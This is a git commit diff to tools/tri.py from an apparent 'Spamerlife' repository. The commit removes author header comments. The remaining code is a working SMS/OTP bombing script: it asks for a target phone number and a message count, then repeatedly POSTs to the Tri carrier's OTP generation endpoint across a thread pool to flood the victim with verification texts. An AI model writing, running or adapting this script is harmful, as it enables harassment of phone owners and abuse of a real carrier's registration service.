886e10f7e28ec6543a23b29e2c6263b071170eb2
Step By Step <52529306+stepbystepexe@users.noreply.github.com>
2020-01-04 19:28:21 +0700

    Update tri.py

--- tools/tri.py
+++ tools/tri.py
@@ -1,20 +1,13 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
-# Coded by Senja
-# Github: github.com/stepbystepexe/Spamerlife
-
 from multiprocessing.pool import ThreadPool
 try:
         import os, time, requests, sys
 except ModuleNotFoundError:
         print("\n\033[0m[\033[1;31m!\033[0m] \033[1;77mModule requests not installed")
         exit(1)
-
 no = input("\033[0m[\033[1;32m+\033[0m] \033[1;77mInput No Target: \033[0m")
 tot = int(input("\033[0m[\033[1;35m?\033[0m] \033[1;77mCount: \033[0m"))
 spam = {'msisdn':no}
 idk = '200'
-
 def main(arg):
         try:
                 r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
@@ -25,7 +18,6 @@ def main(arg):
                         print(r.text)
                         print("\033[0m[\033[1;31m!\033[0m] \033[1;77mFailed")
         except: pass
-
 jobs = []
 for x in range(tot):
     jobs.append(x)
